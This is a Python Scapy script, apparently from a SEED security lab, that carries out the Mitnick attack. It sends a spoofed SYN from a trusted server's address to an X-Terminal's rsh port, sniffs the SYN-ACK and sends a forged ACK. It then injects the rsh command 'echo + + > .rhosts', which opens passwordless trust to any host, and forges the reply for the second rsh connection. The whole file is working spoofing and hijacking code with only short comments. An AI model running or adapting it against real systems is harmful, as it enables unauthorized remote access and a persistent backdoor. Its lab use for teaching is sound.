#!usr/bin/python3
from scapy.all import *
import sys

X_Terminal_IP = "10.0.2.8"
X_Terminal_Port = 514
X_Terminal_Port_2 = 1023

Trusted_Server_IP = "10.0.2.10"
Trusted_Server_Port = 1023
Trusted_Server_Port_2 = 9090

# Sniff and Spoof ACK packet of the 3 way handshake
def pktspoofing(pkt):
	sequence = 778933536 + 1
	old_ip = pkt[IP]
	old_tcp = pkt[TCP]
	tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4
	print("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport,old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))

	# Check if the sniffed packet was SYN+ACK packet
	if old_tcp.flags == "SA":
		print("Sending Spoofed ACK Packet For SYN + ACK Packet...")
		ip_layer = IP(src=Trusted_Server_IP, dst=X_Terminal_IP)
		tcp_layer = TCP(sport=Trusted_Server_Port,dport=X_Terminal_Port,flags="A",seq=sequence, ack= old_ip.seq + 1)
		pkt = ip_layer/tcp_layer # Create the ACK packet
		send(pkt,verbose=0)
		# After sending ACK packet
		print("Sending Spoofed RSH Data Packet To ADD '+ +' to .rhosts file on X-Terminal...")
		data = '9090\x00seed\x00seed\x00echo + + > .rhosts\x00' # Runs the touch command on the x-terminal
		pkt = ip_layer/tcp_layer/data # Creates the packet to be sent along with the DATA and TCP/IP layers 
		send(pkt,verbose=0)

	# Check if the sniffed packet was SYN packet
	if old_tcp.flags == 'S' and old_tcp.dport == Trusted_Server_Port_2 and old_ip.dst == Trusted_Server_IP:
		sequence_num = 378933595
		print("Sending Spoofed SYN + ACK Packet for 2nd TCP Connection...")
		ip_layer = IP(src=Trusted_Server_IP, dst=X_Terminal_IP)
		tcp_layer = TCP(sport=Trusted_Server_Port_2,dport=X_Terminal_Port_2,flags="SA",seq=sequence_num, ack= old_ip.seq + 1)
		pkt = ip_layer/tcp_layer # Create the SYN-ACK packet
		send(pkt,verbose=0)

# Create and send the SYN packet to initiate the 3 way handshake
def spoofSYN():
	print("Sending Spoofed SYN Packet...")
	ip_layer = IP(src="10.0.2.10", dst="10.0.2.8")
	tcp_layer = TCP(sport=1023,dport=514,flags="S", seq=778933536)
	pkt = ip_layer/tcp_layer # Create a SYN packet
	send(pkt,verbose=0)

def main():
	spoofSYN()
	myFilter = "tcp and host 10.0.2.8" # Filter to be applied while sniffing 
	pkt = sniff(filter=myFilter, prn=pktspoofing) # Start sniffing packets

if __name__ == "__main__":
	main()